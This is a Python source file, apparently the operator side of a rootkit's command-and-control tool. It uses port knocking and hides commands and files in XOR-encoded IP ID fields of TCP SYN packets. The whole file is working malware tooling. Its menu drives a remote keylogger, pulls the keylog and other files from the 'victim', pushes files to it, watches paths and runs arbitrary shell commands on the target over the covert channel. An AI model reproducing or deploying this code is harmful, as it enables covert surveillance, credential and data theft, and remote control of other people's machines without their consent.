import sys
import getopt
import os
import time
from multiprocessing import Process
from scapy.all import *

ENCRYPTKEY = '0100101011010111'

def setupEnviro(argv):
    if not os.path.exists('downloads'):
        os.mkdir('downloads')
    targetHost = None
    opts, args = getopt.getopt(argv, "h:",["host="])
    for opt, arg in opts:
        if opt == "-h":
            targetHost = arg
        else:
            pass
    if targetHost is None:
        print("No host provided.")
        targetHost = input("Provide target host")
    if not os.path.exists('downloads/' + targetHost):
        os.mkdir('downloads/' + targetHost)
    return targetHost, [2048, 3024, 5081, 6035, 4096]

def portKnock(t, s):
    for p in s:
        pkt = IP(dst=t) / TCP(dport=p)
        send(pkt)
        print(f"Knock send to: {t} on port {p}")

def writeFile(h, d):
    byteData = bytes(int(d[i:i+8], 2) for i in range(0, len(d), 8))
    with open(h, 'wb') as f:
        f.write(byteData)
    print(f"Done writing file: {h}")

def receiveFile(t, b):
    SYN = 0x02
    data = ""
    header = ""
    dataLength = ""
    headerDone = False
    lengthDone = False
    count = 0
    def packetHandler(pkt):
        nonlocal data
        nonlocal header
        nonlocal dataLength
        nonlocal headerDone
        nonlocal lengthDone
        nonlocal count
        src = pkt[IP].src
        id = pkt[IP].id
        id = format(id, '016b')
        #Decrypting on receive
        id = ''.join([str(int(id[i])^int(ENCRYPTKEY[i])) for i in range(len(id))])
        bit = chr(int(id[-8:], 2))
        if not headerDone:
            if bit == "$":
                headerDone = True
                print("Header Done")
            else:
                header += bit
        elif not lengthDone:
            if bit == "$":
                lengthDone = True
                dataLength = int(dataLength)
                print("Length Done")
            else:
                dataLength += bit
                print("Adding to data length")
        else:
            data += id[-8:]
            count += 1
            print(f"Count: {count} Length: {dataLength}")
            if count == dataLength:
                print("Data done")
                print(f"Header: {header}")
                writeFile('downloads/' + t + '/' + header, data)
                data = ""
                header = ""
                dataLength = ""
                headerDone = False
                lengthDone = False
                count = 0
                return b
    sniff(lfilter = lambda x: x.haslayer(IP) and x[IP].src == t and x.haslayer(TCP) and x[TCP].flags & SYN, stop_filter = packetHandler)

def commandSession(t):
    watcher = Process(target=receiveFile, args=[t, False])
    WATCHING = False
    while True:
        try:
            command = int(input("Please select a menu option: (0-9)\n" +
                                "0. Disconnect from target.\n" +
                                "1. Uninstall from target. \n" +
                                "2. Start keylogger. \n" +
                                "3. Stop keylogger. \n" +
                                "4. Transfer keylog file. \n" +
                                "5. Transfer file to. \n" +
                                "6. Transfer file from. \n" +
                                "7. Watch path. \n" +
                                "8. Stop Watching. \n" +
                                "9. Run program on target. \n"))
        except ValueError as e:
            print(e)
            continue
        if command >= 10:
            continue
        encodedCommand = format(ord(str(command)), '016b')
        print(f"Command: {command}")
        print(encodedCommand)
        #Command decoded.
        print(f"Decoded character: {chr(int(encodedCommand, 2))}")
        print(f"ID: {int(encodedCommand, 2)}")
        #Encrypting id field before sending.
        encodedCommand = ''.join([str(int(encodedCommand[i])^int(ENCRYPTKEY[i])) for i in range(len(encodedCommand))])
        pkt = IP(dst=t,id=int(encodedCommand, 2)) / TCP(dport = 5000)
        if WATCHING:
            if command == 4 or command == 6 or command == 9:
                print("Cannot execute command 4, 6 or 9 while watching. stop watching first.")
                continue
        send(pkt)
        print("After sending")
        if command == 0:
            # Disconnect
            send(pkt)
            print("Disconnected and shutting down.")
            sys.exit(1)
        elif command == 1:
            # Uninstall
            send(pkt)
            print("Root Kit has been uninstalled and stopped on target machine.")
            sys.exit(1)
        elif command == 2:
            #Start Keylogger
            send(pkt)
            print("Keylogger has been started.")
        elif command == 3:
            #Stop Keylogger
            send(pkt)
            print("Keylogger has been stopped.")
        elif command == 4:
            #Transfer Keylog File
            send(pkt)
            print("Commander will prepare to receive keylog file.")
            receiveFile(t, True)
        elif command == 5:
            #Transfer to victim
            #Requires extra data sent
            file = input("input filename of target file to send. (From local directory)")
            with open(file, 'rb') as f:
                data = f.read()
            encodedData = [format(x, '016b') for x in data]
            encodedData = [''.join([str(int(x[i])^int(ENCRYPTKEY[i])) for i in range(len(x))]) for x in encodedData]
            dataPackets = [IP(dst=t, id=int(x, 2)) / TCP(dport=5000) for x in encodedData]
            file += '$' + str(len(dataPackets)) + '$'
            encodedHeader = [format(ord(x), '016b') for x in file]
            encodedHeader = [''.join([str(int(x[i])^int(ENCRYPTKEY[i])) for i in range(len(x))]) for x in encodedHeader]
            headerPackets = [IP(dst=t, id=int(x, 2)) / TCP(dport=5000) for x in encodedHeader]
            for p in headerPackets:
                send(p)
            print("Done sending header")
            for p in dataPackets:
                send(p)
            print("Done sending data")
        elif command == 6:
            #Transfer from victim
            #Requires extra data sent
            file = input("Input filename of target file to request.")
            file += '$'
            print(f"file: {file}")
            encodedHeader = [format(ord(x), '016b') for x in file]
            encodedHeader = [''.join([str(int(x[i])^int(ENCRYPTKEY[i])) for i in range(len(x))]) for x in encodedHeader]
            headerPackets = [IP(dst=t, id=int(x, 2)) / TCP(dport=5000) for x in encodedHeader]
            for p in headerPackets:
                send(p)
            print("Done sending header. Receiving file.")
            receiveFile(t, True)
            #Requires commander to sniff
            pass
        elif command == 7:
            #Watch path
            #Requires extra data sent
            path = input("Enter the path youd like to watch")
            path += '$'
            print(f"Path: {path}")
            encodedPath = [format(ord(x), '016b') for x in path]
            encodedPath = [''.join([str(int(x[i])^int(ENCRYPTKEY[i])) for i in range(len(x))]) for x in encodedPath]
            headerPackets = [IP(dst=t, id=int(x, 2)) / TCP(dport=5000) for x in encodedPath]
            for p in headerPackets:
                send(p)
            print("Done sending header. Sniffing for path updates. Cannot receive other files while watching.")
            watcher.start()
            WATCHING = True
            #Requires commander to sniff
            pass
        elif command == 8:
            #Stop Watching path
            send(pkt)
            #Sleep 5 to ensure victim has sent all file events before stopping.
            time.sleep(5)
            watcher.terminate()
            WATCHING = False
            pass
        elif command == 9:
            #Run a program
            #Requires extra data sent
            #Requires commander to sniff for output
            isShell = input("Are you sending a shell command? (y/n)")
            com = input("Enter the command to send")
            runCommand = isShell + '$' + com + '$'
            encodedCommand = [format(ord(x), '016b') for x in runCommand]
            encodedCommand = [''.join([str(int(x[i])^int(ENCRYPTKEY[i])) for i in range(len(x))]) for x in encodedCommand]
            headerPackets = [IP(dst=t, id=int(x, 2)) / TCP(dport=5000) for x in encodedCommand]
            for p in headerPackets:
                send(p)
            receiveResult(t)
        else:
            print(f"Invalid command: {command}")

def receiveResult(cs):
    SYN = 0x02
    data = ""
    def packetHandler(pkt):
        nonlocal data
        id = pkt[IP].id
        id = format(id, '016b')
        id = ''.join([str(int(id[i])^int(ENCRYPTKEY[i])) for i in range(len(id))])
        bit = chr(int(id[-8:], 2))
        if bit == '$':
            print(data)
            return True
        else:
            data += bit
    sniff(lfilter = lambda x: x.haslayer(IP) and x[IP].src == cs and x.haslayer(TCP) and x[TCP].flags & SYN, stop_filter=packetHandler)

def main(argv):
    target, sequence = setupEnviro(argv)
    portKnock(target, sequence)
    commandSession(target)

if __name__ == '__main__':
    main(sys.argv[1:])
    
    